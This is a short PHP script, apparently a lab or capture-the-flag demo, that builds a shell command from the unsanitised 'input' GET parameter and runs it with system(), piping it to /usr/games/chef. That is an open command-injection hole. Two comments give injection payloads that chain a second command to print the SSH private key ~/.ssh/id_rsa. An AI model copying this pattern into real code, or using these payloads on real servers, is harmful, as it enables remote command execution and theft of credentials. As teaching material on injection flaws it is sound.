<?php
echo '<pre>';

system('echo '.$_GET['input'] .'| /usr/games/chef', $retval);

// echo a ; cat ~/.ssh/id_rsa | /usr/games/chef
// echo a ; cat ~/.ssh/id_rsa ; echo | /usr/games/chef

echo '</pre><hr />'
?>

